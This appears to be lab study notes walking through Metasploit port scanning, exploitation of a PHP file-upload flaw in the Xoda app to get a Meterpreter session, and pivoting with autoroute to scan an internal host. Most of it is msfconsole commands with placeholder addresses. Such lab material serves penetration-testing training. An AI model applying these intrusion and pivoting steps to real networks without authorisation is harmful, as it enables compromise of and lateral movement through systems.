## Why Auxiliary Modules Over Just Nmap?

The key advantage shows up in **post-exploitation pivoting**. Once you've compromised a machine on an internal network, you can use MSF auxiliary modules to scan other internal systems _through_ your compromised host —> something Nmap can't do externally without transferring the binary onto the target.

## Lab Scenario (Two-Target Setup)

```
Attacker (Kali) → Victim 1 (external, port 80) → Victim 2 (internal network only)
```

## Step-by-Step Walkthrough

**1. Initial TCP port scan on Victim 1**

```bash
search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS <target_ip>
set PORTS 1-10000
run
# Result: port 80 open → web server running "Xoda" app
```

**2. Exploit Victim 1 (PHP file upload vuln)**

```bash
search xoda
use <xoda_exploit_module>
set RHOSTS <victim1_ip>
set TARGETURI /
exploit
# Result: Meterpreter session on Victim 1
```

**3. Discover internal network from Victim 1**

```bash
shell
/bin/bash -i
ifconfig          # reveals eth1 with internal subnet IP
exit
```

**4. Add pivot route through Victim 1**

```bash
run autoroute -s <internal_subnet_ip>
background        # sessions now shows session 1 active
```

**5. Scan Victim 2 through the pivot**

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS <victim2_ip>   # internal IP
run
# Result: ports 21 (FTP), 22 (SSH), 80 (HTTP) open
```

**6. UDP scan (bonus)**

```bash
search udp_sweep
use auxiliary/scanner/discovery/udp_sweep
set RHOSTS <target>
run
```

## Key Concepts

| Concept       | Description                                                          |
| ------------- | -------------------------------------------------------------------- |
| **Pivoting**  | Routing attacks through a compromised host to reach internal systems |
| **autoroute** | Meterpreter command that adds a network route for pivoting           |
| `background`  | Suspends a Meterpreter session without closing it                    |
| `sessions`    | Lists all active sessions and their IDs                              |
| `sysinfo`     | Shows target OS and hostname from within Meterpreter                 |
